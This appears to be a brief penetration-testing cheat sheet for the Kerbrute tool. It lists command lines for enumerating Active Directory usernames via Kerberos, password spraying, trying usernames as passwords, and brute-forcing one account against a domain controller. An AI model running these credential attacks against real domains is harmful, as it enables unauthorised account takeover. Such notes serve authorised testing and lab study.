# Kerbrute

### Usage: 

#### It can also show you users that can be AS-REPRoasted

    ./kerbrute userenum --dc DOMAIN_CONTROLLER -d DOMAIN WORDLIST.TXT

#### Password Spray attack

    ./kerbrute passwordspray -d DOMAIN USERS.TXT PASSWORD

    ./kerbrute_linux_amd64 passwordspray -d domain.local --dc 10.10.10.10 WORDLIST.TXT PASSWORD

Try username as password

    kerbrute passwordspray -d domain.local --dc DC_IP --user-as-pass usernames.txt

#### Bruteforce attack

    ./kerbrute_linux_amd64 bruteuser -d domain.local --dc 10.10.10.10 WORDLIST.TXT USER

## TIP: Use the xato-net-10-million-usernames.txt wordlist for blind username enumeration
